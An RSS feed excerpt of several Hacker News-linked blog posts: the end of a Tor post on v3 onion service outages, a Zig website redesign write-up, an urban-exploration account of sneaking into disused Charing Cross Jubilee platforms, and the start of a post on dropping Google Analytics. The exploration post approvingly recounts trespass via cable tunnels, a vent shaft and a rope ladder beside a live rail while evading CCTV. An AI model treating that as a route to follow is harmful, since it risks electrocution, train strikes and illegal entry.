<p><a href="https://metrics.torproject.org/dirbytes.html?start=2020-12-01&amp;end=2021-02-01">This graph</a> shows how the entire network is fielding more directory requests these days. <a href="https://metrics.torproject.org/dirbytes.html?start=2019-10-01&amp;end=2021-02-01">This graph</a> shows more context for where load usually is. The 1.5 Gbit/s the dirauths saw for ~half of 2020 is talked about in <a href="https://gitlab.torproject.org/tpo/core/tor/-/issues/33018">this ticket</a>.</p>

<p>An actual attack could disguise itself like this, but if this were an attack, I would expect it to be more consistently effective at preventing consensus generation.</p>



<p><em>(Last updated 15 Jan 2021)</em></p>

<p>The 14th saw no missing consensuses. If you had trouble reaching v3 onion services on the 14th, your issue is unrelated to the topic of this blog post.</p>

<p>The 15th so far has seen no missing consensuses.</p>



<h2><a name="index2h2"></a>What Tor relays/clients need to be updated?</h2>

<p>No relays need to be updated. Tor clients hosting v3 onion services and Tor clients wishing to visit v3 onion services will need to be updated when the fix is released.</p>

<h2><a name="index3h2"></a>How do I update my Tor?</h2>

<p><em>(Last updated 13 Jan 2021)</em></p>

<p>You don't yet, unless you're willing to compile and use a version of Tor that isn't considered stable yet.
If you're willing, then see <a href="https://blog.torproject.org/node/1969">https://blog.torproject.org/node/1969</a>.</p>

<h2><a name="index4h2"></a>Should we temporarily downgrade to v2 while waiting for a fix?</h2>

<p>If absolutely necessary, sure. Please keep in mind v2's issues (briefly described below in the glossary) and be aware that "temporary" probably means ~1 week (<em>crossing my fingers</em>). I personally will just suffer and wait for the fix to be released.</p>

<h2><a name="index5h2"></a>Are v3 onion services fundamentally broken?</h2>

<p>No.</p>

<h2><a name="index6h2"></a>Is this really major?</h2>

<p>Eh ... yes because of the impact, but no because the fix is easy and will be out quickly.</p>



<h2><a name="index7h2"></a>Directory authorities / dirauths</h2>

<p>There are 9 relays operated by highly trusted individuals that decide the state
of the network. They decide what relays are a part of the network and what
certain network parameters should be set to.</p>

<p>In a way they are a "single" point of failure and make the Tor network
"centralized." Decentralizing their role to 100s, 1000s, or every relay would:</p>

<ol>
<li><p>require massive fundamental changes to how Tor works. By itself this
probably is not a convincing reason to not do it.</p></li>
<li><p>open Tor up to new attacks it currently isn't vulnerable to. This should be
a bit more convincing. The keyword to Google for most of them is "Sybil".</p></li>
</ol>


<p>Having a "single" high quality root of trust is a valuable property that
"decentralize all the things!" people do not generally appreciate enough, in my
opinion.</p>

<p>You: <em>This v3 onion fix doesn't actually address the root problem: the dirauths weren't
able to communicate and create consensuses.</em></p>

<p>Yes! You are absolutely right that <em>something</em> about how the dirauths work should
change such that they can continue communicating with each other even in the
presence of malicious (purposefully malicious or not) traffic!
<a href="https://gitlab.torproject.org/tpo/core/tor/-/issues/40239">This ticket</a> is one idea and a good place to start your research
if I say nothing more and you want to research what is being done yourself.
They might also update <a href="https://gitlab.torproject.org/tpo/core/tor/-/issues/33018">this ticket</a>.</p>

<h2><a name="index8h2"></a>V3 onion service</h2>

<p>The new type of onion service. Names are 56 characters long, like
tv54samlti22655ohq3oaswm64cwf7ulp6wzkjcvdla2hagqcu7uokid.onion. V2 onions are
16 characters long, like 3g2upl4pq6kufc4m.onion.</p>

<p>V2 onion services use old crypto and old protocols that are obsolete and
dangerous <em>now</em> or will be soon. The code for v2 is messy and the protocol is
not extensible. V2 onions are vulnerable to harvesting by malicious HSDirs, and these malicious HSDirs exist today (and are removed as soon as they are detected).
Support for v2 onion services will be removed from Tor soon. V3 onions are the
future despite the current events.</p>

<h2><a name="index9h2"></a>Fallback directory mirror / fallback dir</h2>

<p>Tor clients don't usually <em>directly</em> fetch consensus information from a dirauth
anymore. There's too many people using Tor and only 9 dirauths. Instead, a
large number of relays that are high quality have opted in to also be hardcoded
into Tor source code so clients can usually fetch consensus data from them on
first run. After first run and successful connection to Tor, clients get this
stuff from their guard instead.</p>

<h2><a name="index10h2"></a>Consensus</h2>

<p>The dirauths vote on what relays are currently in the network and what certain network
parameters should be set to. The "average" of their votes become the consensus.
They make a consensus every hour and each is valid for three hours. Clients typically
fetch a new consensus every two hours.</p>

<p>You can see information from the current consensus <a href="https://consensus-health.torproject.org/">here</a>. Recent consensuses
are archived <a href="https://metrics.torproject.org/collector/recent/relay-descriptors/consensuses/">here</a>
and older ones archived <a href="https://metrics.torproject.org/collector/archive/relay-descriptors/consensuses/">here</a>.</p>



</section>









</div>



</article></div>]]>
            </description>
            <link>https://matt.traudt.xyz/posts/tracking-tors-network-wide-v3-onion-service-outages</link>
            <guid isPermaLink="false">hacker-news-small-sites-25774167</guid>
            <pubDate>Thu, 14 Jan 2021 09:34:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The First Zig Website Redesign]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25774158">thread link</a>) | @pron
<br/>
January 14, 2021 | https://kristoff.it/blog/first-zig-website-redesign/ | <a href="https://web.archive.org/web/*/https://kristoff.it/blog/first-zig-website-redesign/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Up until the publication of this post, if you went to the front page of <a href="https://ziglang.org/" target="_blank" rel="nofollow noopener noreferrer">https://ziglang.org</a>, you would be greeted with a multi-page explanation about how Zig improves over the systems programming toolchains that today we take for granted.</p>
<p>If you have done enough of that kind of programming, you’ll immediately see how Zig is tackling relevant problems, but if you don’t have such experience, then the front page could very easily look like a never-ending list of things you don’t have an opinion about.</p>
<figure>
    <span>
      <a href="https://kristoff.it/static/534b1bc1bc6f429e8bf3182eb5230216/bb7a5/old-zig-website.png" target="_blank" rel="noopener">
    <span></span>
  <picture>
        <source srcset="https://kristoff.it/static/534b1bc1bc6f429e8bf3182eb5230216/f5e3c/old-zig-website.webp 100w,
https://kristoff.it/static/534b1bc1bc6f429e8bf3182eb5230216/f2fbe/old-zig-website.webp 200w,
https://kristoff.it/static/534b1bc1bc6f429e8bf3182eb5230216/e227a/old-zig-website.webp 400w,
https://kristoff.it/static/534b1bc1bc6f429e8bf3182eb5230216/965c5/old-zig-website.webp 600w,
https://kristoff.it/static/534b1bc1bc6f429e8bf3182eb5230216/0cbce/old-zig-website.webp 800w,
https://kristoff.it/static/534b1bc1bc6f429e8bf3182eb5230216/823bd/old-zig-website.webp 2016w" sizes="(max-width: 400px) 100vw, 400px" type="image/webp">
        <source srcset="https://kristoff.it/static/534b1bc1bc6f429e8bf3182eb5230216/c0399/old-zig-website.png 100w,
https://kristoff.it/static/534b1bc1bc6f429e8bf3182eb5230216/9ec3c/old-zig-website.png 200w,
https://kristoff.it/static/534b1bc1bc6f429e8bf3182eb5230216/c7805/old-zig-website.png 400w,
https://kristoff.it/static/534b1bc1bc6f429e8bf3182eb5230216/34e8a/old-zig-website.png 600w,
https://kristoff.it/static/534b1bc1bc6f429e8bf3182eb5230216/8ff1e/old-zig-website.png 800w,
https://kristoff.it/static/534b1bc1bc6f429e8bf3182eb5230216/bb7a5/old-zig-website.png 2016w" sizes="(max-width: 400px) 100vw, 400px" type="image/png">
        <img src="https://kristoff.it/static/534b1bc1bc6f429e8bf3182eb5230216/c7805/old-zig-website.png" alt="The original homepage" title="The original homepage featured a pretty big ToC">
      </picture>
  </a>
    </span>
    <figcaption>The original homepage featured a pretty big ToC</figcaption>
  </figure>
<p>When the Zig project started, its audience was almost exclusively people with a lot of relevant experience, since those would be the only ones able to evaluate the promise and limits of the newborn language.</p>
<p>Today we’re at a point where Zig is becoming increasingly compelling for people coming from all layers of the stack. People have written <a href="https://github.com/Hejsil/mecha" target="_blank" rel="nofollow noopener noreferrer">parser combinators</a>, <a href="https://github.com/prime31/zig-gamekit" target="_blank" rel="nofollow noopener noreferrer">2d game rendering libraries</a>, <a href="https://www.mattkeeter.com/projects/futureproof/" target="_blank" rel="nofollow noopener noreferrer">a live editor for GPU shaders</a>, and much more. </p>
<figure>
    <span>
      <a href="https://kristoff.it/static/95e0e4b253811f7ad42c415ffd4d13bb/6ff5e/seascape-futureproof.png" target="_blank" rel="noopener">
    <span></span>
  <picture>
        <source srcset="https://kristoff.it/static/95e0e4b253811f7ad42c415ffd4d13bb/f5e3c/seascape-futureproof.webp 100w,
https://kristoff.it/static/95e0e4b253811f7ad42c415ffd4d13bb/f2fbe/seascape-futureproof.webp 200w,
https://kristoff.it/static/95e0e4b253811f7ad42c415ffd4d13bb/e227a/seascape-futureproof.webp 400w,
https://kristoff.it/static/95e0e4b253811f7ad42c415ffd4d13bb/965c5/seascape-futureproof.webp 600w,
https://kristoff.it/static/95e0e4b253811f7ad42c415ffd4d13bb/0cbce/seascape-futureproof.webp 800w,
https://kristoff.it/static/95e0e4b253811f7ad42c415ffd4d13bb/6bc95/seascape-futureproof.webp 1200w" sizes="(max-width: 400px) 100vw, 400px" type="image/webp">
        <source srcset="https://kristoff.it/static/95e0e4b253811f7ad42c415ffd4d13bb/c0399/seascape-futureproof.png 100w,
https://kristoff.it/static/95e0e4b253811f7ad42c415ffd4d13bb/9ec3c/seascape-futureproof.png 200w,
https://kristoff.it/static/95e0e4b253811f7ad42c415ffd4d13bb/c7805/seascape-futureproof.png 400w,
https://kristoff.it/static/95e0e4b253811f7ad42c415ffd4d13bb/34e8a/seascape-futureproof.png 600w,
https://kristoff.it/static/95e0e4b253811f7ad42c415ffd4d13bb/8ff1e/seascape-futureproof.png 800w,
https://kristoff.it/static/95e0e4b253811f7ad42c415ffd4d13bb/6ff5e/seascape-futureproof.png 1200w" sizes="(max-width: 400px) 100vw, 400px" type="image/png">
        <img src="https://kristoff.it/static/95e0e4b253811f7ad42c415ffd4d13bb/c7805/seascape-futureproof.png" alt="Futureproof, a live editor for GPU shaders" title="Futureproof, a live editor for GPU shaders">
      </picture>
  </a>
    </span>
    <figcaption>Futureproof, a live editor for GPU shaders</figcaption>
  </figure>
<p>Don’t get me wrong: all these projects have been developed by early adopters who wanted to try <a href="https://www.merriam-webster.com/dictionary/buggy" target="_blank" rel="nofollow noopener noreferrer">a new and exciting</a> ecosystem. Zig is not yet stable, and won’t be for a while, but we’re getting there, and in the meantime Zig is already delivering big time on at least one promise: <strong>making it possible to learn more about programming without having to first buy into vast amounts of accidental complexity</strong>.</p>
<p>This redesign had two main goals and, as always, a few practical constraints. When it comes to constraints, it’s mostly my web design and project management skills, and the scope that can be addressed in no more than a couple of months, since we needed a new website <em>now</em> and not one year from now. Let’s now take a look at the goals.</p>
<h2 id="a-friendlier-first-impression"><a href="#a-friendlier-first-impression" aria-label="a friendlier first impression permalink"></a>A friendlier first impression</h2>
<p>The first goal addressed stems directly from the introduction of this blog post: we wanted to make the website more appealing to people that are looking at Zig as an opportunity to learn more about programming. For this reason, the lengthy breakdown has been moved to the Learn section and, in its place, we now have three short paragraphs that highlight some of Zig’s major features, followed by a code sample that gives you a first taste of the syntax. </p>
<p>Above the main introduction we still have the same slogan as before:</p>
<blockquote>
<p>Zig is a general-purpose programming language and toolchain for maintaining <strong>robust</strong>, <strong>optimal</strong>, and <strong>reusable</strong> software.</p>
</blockquote>
<p>Andrew did an outstanding job at formulating it and I believe it’s the one bit of the entire website that should probably never change.</p>
<p>Next to the slogan there’s a new cluster of buttons. This is where I wanted to come up with an interesting compromise: we follow the popular trend of putting a big call to action for new users, but we also use that block of space to create a single hotspot where regulars can get access to critical information. </p>
<figure>
    <span>
      <a href="https://kristoff.it/static/14fc54ffd1ae3940e6e81fe6b1532e61/af83c/button-cluster.png" target="_blank" rel="noopener">
    <span></span>
  <picture>
        <source srcset="https://kristoff.it/static/14fc54ffd1ae3940e6e81fe6b1532e61/f5e3c/button-cluster.webp 100w,
https://kristoff.it/static/14fc54ffd1ae3940e6e81fe6b1532e61/f2fbe/button-cluster.webp 200w,
https://kristoff.it/static/14fc54ffd1ae3940e6e81fe6b1532e61/e227a/button-cluster.webp 400w,
https://kristoff.it/static/14fc54ffd1ae3940e6e81fe6b1532e61/a9736/button-cluster.webp 552w" sizes="(max-width: 400px) 100vw, 400px" type="image/webp">
        <source srcset="https://kristoff.it/static/14fc54ffd1ae3940e6e81fe6b1532e61/c0399/button-cluster.png 100w,
https://kristoff.it/static/14fc54ffd1ae3940e6e81fe6b1532e61/9ec3c/button-cluster.png 200w,
https://kristoff.it/static/14fc54ffd1ae3940e6e81fe6b1532e61/c7805/button-cluster.png 400w,
https://kristoff.it/static/14fc54ffd1ae3940e6e81fe6b1532e61/af83c/button-cluster.png 552w" sizes="(max-width: 400px) 100vw, 400px" type="image/png">
        <img src="https://kristoff.it/static/14fc54ffd1ae3940e6e81fe6b1532e61/c7805/button-cluster.png" alt="The new button cluster" title="The new button cluster">
      </picture>
  </a>
    </span>
    <figcaption>The new button cluster</figcaption>
  </figure>
<p>My hope is for the big button to make new visitors become aware of that block and that, over time, checking there for docs and new releases just becomes muscle memory. That said, I know we’ll have to tweak the design once the auto-generated docs for the standard library become good enough for the front page.</p>
<p>Below everything I just described, we introduce the community and the Zig Software Foundation. The Zig project has grown to a point where governance matters and we want to show we’re doing everything the right way, up to the point of having formed a <a href="https://ziglang.org/zsf/" target="_blank" rel="nofollow noopener noreferrer">nonprofit organization with a clear scope and mission statement</a>.</p>
<h2 id="internationalization"><a href="#internationalization" aria-label="internationalization permalink"></a>Internationalization</h2>
<p>The second goal of this redesign was to open the door to hosting multiple translations of the website. Having an i18n-enabled website is beneficial for multiple reasons: it helps with the first goal (i.e. help a wider range of programmers get started with Zig), it’s a good way of getting more use out of the informative materials we’ll progressively add to the website, and it’s also well aligned with the mission of the Zig Software Foundation. Lastly, I’m personally invested in the idea that we must ensure we don’t leave it to third parties to be the sole owners of all content available in a given language, as we’ve already seen bad actors exploit their position to implement a form of cultural arbitrage.</p>
<p>We’re well aware that keeping up with translations to multiple languages can quickly become an effort black hole. For this reason, I’ve tried to make sure the tooling would help in making the process as smooth as possible (more on that later), and I’ve also made sure to clarify in the design how translations are community-provided and thus best-effort.</p>
<figure>
    <span>
      <a href="https://kristoff.it/static/d2f40c1cc91417d645fdd614ae7aa9f5/c6a5f/translation-link.png" target="_blank" rel="noopener">
    <span></span>
  <picture>
        <source srcset="https://kristoff.it/static/d2f40c1cc91417d645fdd614ae7aa9f5/f5e3c/translation-link.webp 100w,
https://kristoff.it/static/d2f40c1cc91417d645fdd614ae7aa9f5/f2fbe/translation-link.webp 200w,
https://kristoff.it/static/d2f40c1cc91417d645fdd614ae7aa9f5/e227a/translation-link.webp 400w,
https://kristoff.it/static/d2f40c1cc91417d645fdd614ae7aa9f5/965c5/translation-link.webp 600w,
https://kristoff.it/static/d2f40c1cc91417d645fdd614ae7aa9f5/0cbce/translation-link.webp 800w,
https://kristoff.it/static/d2f40c1cc91417d645fdd614ae7aa9f5/ffd30/translation-link.webp 1628w" sizes="(max-width: 400px) 100vw, 400px" type="image/webp">
        <source srcset="https://kristoff.it/static/d2f40c1cc91417d645fdd614ae7aa9f5/c0399/translation-link.png 100w,
https://kristoff.it/static/d2f40c1cc91417d645fdd614ae7aa9f5/9ec3c/translation-link.png 200w,
https://kristoff.it/static/d2f40c1cc91417d645fdd614ae7aa9f5/c7805/translation-link.png 400w,
https://kristoff.it/static/d2f40c1cc91417d645fdd614ae7aa9f5/34e8a/translation-link.png 600w,
https://kristoff.it/static/d2f40c1cc91417d645fdd614ae7aa9f5/8ff1e/translation-link.png 800w,
https://kristoff.it/static/d2f40c1cc91417d645fdd614ae7aa9f5/c6a5f/translation-link.png 1628w" sizes="(max-width: 400px) 100vw, 400px" type="image/png">
        <img src="https://kristoff.it/static/d2f40c1cc91417d645fdd614ae7aa9f5/c7805/translation-link.png" alt="Link present on all translated pages" title="Link present on all translated pages">
      </picture>
  </a>
    </span>
    <figcaption>Link present on all translated pages</figcaption>
  </figure>
<p>At the moment of publication, the website can only offer <a href="https://ziglang.org/translations/" target="_blank" rel="nofollow noopener noreferrer">an Italian translation</a> written by me. Italian was chosen out of necessity (i.e. it’s the only other language I speak), but it served the purpose of making me try out the ergonomics of producing a translation, and it can also act as documentation for others.</p>
<p>Finally, I should point out that there are some parts of the website we don’t plan to translate, like the News section, for example. This is another choice made out of necessity: we want to restrict translations to content with a long shelf life to reduce the amount of effort, but I don’t exclude that one day we might have enough resources to get rid of this compromise.</p>
<h2 id="implementation-details"><a href="#implementation-details" aria-label="implementation details permalink"></a>Implementation details</h2>
<p>The new website is statically generated by <a href="https://gohugo.io/" target="_blank" rel="nofollow noopener noreferrer">Hugo</a>. I also considered <a href="https://www.getzola.org/" target="_blank" rel="nofollow noopener noreferrer">Zola</a>, but its i18n support is not complete yet. The website lists a number of Zig code snippets, with relative output. Andrew originally implemented a program to produce release notes and language reference. That program takes in code samples, applies syntax highlighting, runs the code, and reports the output as HTML (it even retains colors from the terminal). I took the original code and packaged it as a tool with a more general interface. I called it <a href="https://github.com/kristoff-it/zig-doctest" target="_blank" rel="nofollow noopener noreferrer">zig-doctest</a> and it can be easily integrated with all kinds of static content generation tools.</p>
<p>Now a successful CI build of the <a href="https://github.com/ziglang/zig" target="_blank" rel="nofollow noopener noreferrer">ziglang/zig</a> repository triggers a build of the website, allowing us to catch outdated code examples much more easily. This addresses concerns raised in the past by people that would occasionally stumble upon a broken code sample.</p>
<p>Testing all code snippets is not instant as some tests include running the executable and capturing its output, so I made sure to integrate with Hugo’s caching system. I also noticed that Hugo processes tags sequentially within the same page, so I also <a href="https://github.com/kristoff-it/hugo" target="_blank" rel="nofollow noopener noreferrer">added to it</a> a warmup routine that makes sure to parallelize the testing when loading the development server the first time.</p>
<p>The result is a very enjoyable development experience that only depends on Zig and two additional executables (Hugo and doctest) to be able to develop the Zig website locally, resulting in an acceptable experience for potential contributors. </p>
<h2 id="conclusion"><a href="#conclusion" aria-label="conclusion permalink"></a>Conclusion</h2>
<p>I hope this post explains adequately the intent of this work and the practical limits of its execution. There’s still more work to do, but this seems a reasonable milestone for a first release, so I’m looking forward to working alongside the community to improve and add translations to the website.</p>
<p>For the next iteration I’ll work on improving accessibility, but first I have to focus on <a href="https://fosdem.org/2021/schedule/track/zig_programming_language/" target="_blank" rel="nofollow noopener noreferrer">FOSDEM, since we have a Zig dev room</a> and I have a bunch of duties to attend to. </p>
<p>When I first discovered Zig, I saw it as a way for me to learn more about all the aspects of programming I missed when working with interpreted and/or garbage-collected languages. Turns out I got to learn that <a href="https://ziglang.org/news/announcing-zig-software-foundation/" target="_blank" rel="nofollow noopener noreferrer">and much more</a>, and I can’t tell you how excited I am about what’s to come. Despite everything, 2020 was a great year for Zig, and I fully expect 2021 to be even better.</p></div></div>]]>
            </description>
            <link>https://kristoff.it/blog/first-zig-website-redesign/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25774158</guid>
            <pubDate>Thu, 14 Jan 2021 09:33:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Charing Cross, disused metro platforms in London (2013)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25773986">thread link</a>) | @mpsq
<br/>
January 14, 2021 | http://www.guerrillaexploring.com/gesite/public_html/index.php?option=com_content&view=article&id=345:ges220-charing-cross-disused-jubilee-platforms&catid=52:metro&Itemid=67 | <a href="https://web.archive.org/web/*/http://www.guerrillaexploring.com/gesite/public_html/index.php?option=com_content&view=article&id=345:ges220-charing-cross-disused-jubilee-platforms&catid=52:metro&Itemid=67">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The Jubilee line used to run from Stanmore to Charing Cross, and was opened in May 1979. However Charing Cross was always supposed to be a temporary terminus, with the final destination of &nbsp;Cannon St Station. At the time it was called the Fleet Line, as it would pass under the Fleet River (now a <a href="http://www.guerrillaexploring.com/gesite/public_html/index.php?option=com_content&amp;view=article&amp;id=53:ges092-river-f-cso&amp;catid=53:draining&amp;Itemid=68">sewer</a>). There wasn't any money during the tough times of the late 1970's, only after the prosperous years under Thatcherism did money become available for the extension, and it was decided to take a different route, rather than to&nbsp; Ludgate Circus. The present Jubilee Line extension runs to Stratford. This meant that the line would run from Green Park to Westminster, bypassing Charing Cross. When the Jubilee Line Extension opened in November 1999, Charing Cross Jubilee Line Platforms became redundant. Many plans have been floated around, including a Jubilee Line Spur to Cannon St Station, as well as an extension of the Docklands Light Railway from Bank via also redundant Aldwych and into Charing Cross.</p>
<p>Of all the bits and pieces on the underground, here was always considered one of the toughest, along with <a href="http://www.guerrillaexploring.com/gesite/public_html/index.php?option=com_content&amp;view=article&amp;id=226:ges154-brtsh-museum-tube&amp;catid=52:metro&amp;Itemid=67">Museum station</a>. One access point tried by a number of people, would see a squad of cops arrive within seconds of breathing near it. Other options would have involved running down the tracks after service. And because this bit of the station is on a non-regular service branch line, it would be a 1000m run into what could be anything, a heritage train, service train, reversed train. All of which would leave the adventurous explorer smeared down the tunnel walls. Not a pretty site or way to go. GE077 loves his research, and had banded about a few possibilities. We'd looked at some of them, and they didn't seem possible. Eventually we happened to find a lid in a street not far away, that lead into a maze of cramped tunnels, carrying thick high voltage cables. A small gap existed that could get us into the vent shaft. It was so tight, that after GE077 managed to get through, I had to practically get naked to squeeze my longer body through. It's a scary moment when you are half way through and can't move back or forwards. I calmed down, and managed to twist up and down etc to get through.</p>
<p><img src="http://www.guerrillaexploring.com/gesite/public_html/images/guerrilla/GDS214/ges214-19.jpg" width="842" height="575"></p>
<p>Eventually we were in the huge shaft that lead into the heavens</p>
<p><img src="http://www.guerrillaexploring.com/gesite/public_html/images/guerrilla/DEV220/GES220-01.jpg"></p>
<p>One ladder down from the vent, there was a another steel ringed tunnel leading off to the Northern Line platforms ventilation grills. This was taken looking in from the shaft above.</p>
<p><img src="http://www.guerrillaexploring.com/gesite/public_html/images/guerrilla/DEV220/GES220-02.jpg"></p>
<p>A passenger walkway seen through a grill in the tunnel to the Northern Line Vents.</p>
<p><img src="http://www.guerrillaexploring.com/gesite/public_html/images/guerrilla/DEV220/GES220-03.jpg"></p>
<p>Walking a bit further, the tunnel went up a slope. The light opposite the white brick stump, is where the shot above was taken. It's also the point where the tunnel changes from the bit with large pipes leading out of the main vent shaft, changes to the open one in the pic below.</p>
<p><img src="http://www.guerrillaexploring.com/gesite/public_html/images/guerrilla/DEV220/GES220-05.jpg"></p>
<p>Turning around from the pic above, there were a couple of floor grates and some electrical cabinets. This is looking down on to the Northern Line Platforms.</p>
<p><img src="http://www.guerrillaexploring.com/gesite/public_html/images/guerrilla/DEV220/GES220-04.jpg"></p>
<p>We walked back to the main vent shaft, and headed further down the shaft. The landing we walked from can just be seen at the top of the picture.</p>
<p><img src="http://www.guerrillaexploring.com/gesite/public_html/images/guerrilla/DEV220/GES220-06.jpg"></p>
<p>Turning around from the pic above, one sees the short ventilation tunnel, similar to many other stations. The lit up portals lead to grill openings above the disused Jubilee platforms.</p>
<p><img src="http://www.guerrillaexploring.com/gesite/public_html/images/guerrilla/DEV220/GES220-07.jpg"></p>
<p>Looking through one of the portals into a ventilation grill and the prize beyond. We had one stumbling block left, how to get down to the platforms. The only way would be to squeeze through the tiny opening on the side. That would leave the problem of getting down to the platform. Also the fact that the grill dropped onto the tracks, not the platform. We had with us a rope ladder to complete the job. We had to attach it to the grill and check it didn't touch the live rail. &nbsp;We also shook hands, if we were caught, the repercussions would be that we wouldn't be allowed to talk to each other. We'd had a pretty good ride, so it wasn't a sad moment.&nbsp; &nbsp;Going down the ladder first, I tried to go as quickly but stable as possible. Without risking hitting the rope tails of the ladder on the live rail. When down, I held the ladder over the platform for GE077. The remaining small problem was that the station is rigged with cctv cameras, including dome cameras, which would have been installed after the station closed. We gave each other 5-10mins to grab our shots and get the hell out.</p>
<p><img src="http://www.guerrillaexploring.com/gesite/public_html/images/guerrilla/DEV220/GES220-08.jpg"></p>
<p>I quickly ran up the steps to Trafalgar Square and Bakerloo line access, which would have been at the end of the this tunnel, instead one can see the white wall at the end. The Embankment sticker on the wall is a recent addition since closing.</p>
<p><img src="http://www.guerrillaexploring.com/gesite/public_html/images/guerrilla/DEV220/GES220-09.jpg"></p>
<p>The steps and non working escalators from the shot above.</p>
<p><img src="http://www.guerrillaexploring.com/gesite/public_html/images/guerrilla/DEV220/GES220-10.jpg"></p>
<p>Looking at the bottom of the steps/escalators above.</p>
<p><img src="http://www.guerrillaexploring.com/gesite/public_html/images/guerrilla/DEV220/GES220-11.jpg"></p>
<p>From the circulation area to the platforms. The Circulation area wasn't that long, certainly shorter than the platforms. Note the dome camera above the poster beneath the last strip light on the left.</p>
<p><img src="http://www.guerrillaexploring.com/gesite/public_html/images/guerrilla/DEV220/GES220-12.jpg"></p>
<p>A platform with the original station guide on the far wall, the Jubilee line extension runs from Green Park to Westminster now. Running up the tunnel at the top of the platforms would lead to Green Park.</p>
<p><img src="http://www.guerrillaexploring.com/gesite/public_html/images/guerrilla/DEV220/GES220-13.jpg"></p>
<p>An explanation for the short circulation area, an alcove area leads to a door into a sub station.</p>
<p><img src="http://www.guerrillaexploring.com/gesite/public_html/images/guerrilla/DEV220/GES220-14.jpg"></p>
<p>Looking the other way up Platform 3, the tunnel at the top with the lights on is the overrun tunnel.</p>
<p><img src="http://www.guerrillaexploring.com/gesite/public_html/images/guerrilla/DEV220/GES220-15.jpg"></p>
<p>A shot inside the overrun tunnel, it bends round to the right after 20 odd metres. Sadly I figured it to risky to go have a look around the corner. It's said the tunnel runs to within a short distance of Aldwych (originally Strand station), however never linked up. Two full tube trains can be stabled here. (Trip 2 will cover this area more).</p>
<p><img src="http://www.guerrillaexploring.com/gesite/public_html/images/guerrilla/DEV220/GES220-16.jpg"></p>
<p>Looking back into the station from the overrun tunnel.</p>
<p><img src="http://www.guerrillaexploring.com/gesite/public_html/images/guerrilla/DEV220/GES220-17.jpg"></p>
<p>The top of the opposite escalators, that lead to the Northern Line.</p>
<p><img src="http://www.guerrillaexploring.com/gesite/public_html/images/guerrilla/DEV220/GES220-18.jpg"></p>
<p>Looking down the escalators (of which there are 3 on this side, rather than 2 and a central set of steps on the Bakerloo side) from the above shot.</p>
<p><img src="http://www.guerrillaexploring.com/gesite/public_html/images/guerrilla/DEV220/GES220-19.jpg"></p>
<p>An area of offices in the middle of the circulation area. The 3 escalators in the background are above.</p>
<p><img src="http://www.guerrillaexploring.com/gesite/public_html/images/guerrilla/DEV220/GES220-20.jpg"></p>
<p>Having watched the latest James Bond flick a few months before coming here, I couldn't help but add a little nod to one of the scenes from Skyfall, which was filmed here.</p>
<p><img src="http://www.guerrillaexploring.com/gesite/public_html/images/guerrilla/DEV220/GES220-21.jpg"></p>
<p>And after this shot, I raced back to the platform. As I looked left and right, I couldn't see the rope ladder that GE077 had already left a few minutes earlier by. I thought briefly he'd done the dirty on me and left me stranded to await my fate. However after a few puzzling moments, realised I was on the wrong platform! It's confusing down here when everything is so symmetrical. &nbsp;I went to the correct platform, climbed back up and eventually got back to the street. Meeting up with GE077 some streets away. We were both wild that we'd pulled it off, and quickly left the area.</p>
<p>Continued in <a href="http://www.guerrillaexploring.com/gesite/public_html/index.php?option=com_content&amp;view=article&amp;id=370:ges220-charing-cr0ss-overrun-tunnel-a-vent-shaft-part-2&amp;catid=52:metro&amp;Itemid=67">Trip 2</a>...</p>

</div></div>]]>
            </description>
            <link>http://www.guerrillaexploring.com/gesite/public_html/index.php?option=com_content&amp;view=article&amp;id=345:ges220-charing-cross-disused-jubilee-platforms&amp;catid=52:metro&amp;Itemid=67</link>
            <guid isPermaLink="false">hacker-news-small-sites-25773986</guid>
            <pubDate>Thu, 14 Jan 2021 09:12:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I removed Google Analytics and still have good data to analyze]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25773775">thread link</a>) | @fagnerbrack
<br/>
January 14, 2021 | http://tnickel.de/2020/12/24/2020-12-How-I-replaced-google-analytics-on-my-website/ | <a href="https://web.archive.org/web/*/http://tnickel.de/2020/12/24/2020-12-How-I-replaced-google-analytics-on-my-website/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main" itemscope="" itemprop="blogPost">
  
	<article itemprop="articleBody"> 
		<header>
  
  <p>
    <time datetime="2020-12-24T03:38:37.000Z" itemprop="datePublished"> Published 2020-12-24</time>
    
  </p>
</header>
	<div>
		
		<p>How I removed google analytics and still have good data to analyze. It was just recently, that I opened my google analytics account and added it to this website. I wanted to get some insights, about my website’s visitors. But compared to the google search console, there was not much information interesting to me. </p>
<p>And actually I worried a little. Is it legal to just add analytics? analytics was easy to add, just adding a script tag into my page. In EU it is needed to inform the user about non essential cookies. Before setting one, it is needed to ask the users consent. However, analytics got added using a static html tag and there is no way to control what cookies are set immediately.</p>
<p>I was not sure if I should create that script tag dynamically after asking the user, using some client side javascript. and would analytics still work?</p>
<p>On the internet when searching for analytics without cookies there are many websites advising to use <code>motomo</code>. It is a very good solution made with php and mysql. But for my little blog setting up this server seem a little to much. Also because I would have to look that I keep it up do date and do some more security measures. For real production application, google analytics and <a href="https://matomo.org/" rel="nofollow" target="_blank">motomo</a>, both will be a better choice recording lots of data you don’t know now you want to have in the future.</p>
<p>I added a little script into my website. Instead of cookies it uses local storage. local storage can not be used to track users across other websites. So I think this should comply with the law. Also in the storage there is nothing stored to identify the user.</p>
